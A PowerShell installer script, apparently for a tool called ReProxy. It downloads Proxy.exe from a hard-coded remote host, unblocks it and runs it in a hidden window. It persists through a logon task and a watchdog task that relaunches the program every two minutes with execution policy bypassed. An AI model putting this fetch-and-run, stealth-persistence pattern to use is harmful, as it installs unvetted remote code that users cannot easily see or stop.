# ReProxy remote install - ASCII only for PowerShell 5.1 compatibility
param(
    [switch]$Silent
)

$ErrorActionPreference = "Continue"
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    Unblock-File -LiteralPath $scriptPath -ErrorAction SilentlyContinue
}
$BaseUrl = $env:RESA_INSTALL_BASE
if (-not $BaseUrl) {
    $BaseUrl = "https://olxp.cc/download"
}
$BaseUrl = $BaseUrl.Trim().TrimEnd("/")
if ($BaseUrl -match "\s") {
    $BaseUrl = ($BaseUrl -split "\s+")[0]
}

$Dir = Join-Path $env:LOCALAPPDATA "ReProxy"
$Exe = Join-Path $Dir "Proxy.exe"
$Temp = Join-Path $env:TEMP "ReProxy-download.exe"
$LogFile = Join-Path $env:TEMP "ReProxy-install.log"
$script:HadError = $false

function Write-InstallLog {
    param([string]$Text)
    $line = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + " " + $Text
    try {
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {
        $null = $_
    }
    if (-not $Silent) {
        Write-Host $Text
    }
}

function Fail-Install {
    param([string]$Text)
    $script:HadError = $true
    Write-InstallLog $Text
    if (-not $Silent) {
        Write-Host $Text -ForegroundColor Red
    }
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutFile
    )

    $ProgressPreference = "SilentlyContinue"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    } catch {
        $null = $_
    }

    $curl = Join-Path $env:SystemRoot "System32\curl.exe"
    if (Test-Path -LiteralPath $curl) {
        & $curl -fsSL --retry 2 --retry-delay 1 -o $OutFile $Url
        if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $OutFile)) {
            return
        }
    }

    Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing
}

function Register-WatchdogTask {
    param(
        [string]$TaskName,
        [string]$Dir
    )

    $WatchdogScript = Join-Path $Dir "watchdog.ps1"
    @'
$ErrorActionPreference = 'SilentlyContinue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
$exe = Join-Path $dir 'Proxy.exe'
$newExe = Join-Path $dir 'Proxy.new.exe'
if (Test-Path -LiteralPath $newExe) { exit 0 }
if (Get-Process -Name 'Proxy' -ErrorAction SilentlyContinue) { exit 0 }
if (-not (Test-Path -LiteralPath $exe)) { exit 0 }
Start-Process -FilePath $exe -WorkingDirectory $dir -WindowStyle Hidden
'@ | Set-Content -LiteralPath $WatchdogScript -Encoding UTF8

    $PowerShell = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
    $Action = New-ScheduledTaskAction -Execute $PowerShell -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$WatchdogScript`"" -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 3650)
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 1) -MultipleInstances IgnoreNew
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
}

Write-InstallLog "install start"
Write-InstallLog ("target: " + $Exe)

try {
    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
} catch {
    $null = $_
}

try {
    $url = $BaseUrl + "/Proxy.exe"
    Write-InstallLog ("download: " + $url)
    Download-File -Url $url -OutFile $Temp
    if (-not (Test-Path -LiteralPath $Temp)) {
        Fail-Install "download failed"
        exit 1
    }
    if (Test-Path -LiteralPath $Exe) {
        Remove-Item -LiteralPath $Exe -Force -ErrorAction SilentlyContinue
    }
    Move-Item -LiteralPath $Temp -Destination $Exe -Force
    Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue
    Write-InstallLog "download ok"
} catch {
    Fail-Install ("download error: " + $_.Exception.Message)
    exit 1
}

try {
    $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
    Register-ScheduledTask -TaskName "ReProxy" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
    Write-InstallLog "startup task ok"
} catch {
    Write-InstallLog ("startup task skipped: " + $_.Exception.Message)
}

try {
    Register-WatchdogTask -TaskName "ReProxy-Watchdog" -Dir $Dir
    Write-InstallLog "watchdog task ok"
} catch {
    Write-InstallLog ("watchdog task skipped: " + $_.Exception.Message)
}

try {
    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
    Write-InstallLog "started Proxy.exe"
} catch {
    Write-InstallLog ("start skipped: " + $_.Exception.Message)
}

if ($script:HadError) {
    exit 1
}
Write-InstallLog "install done"
exit 0
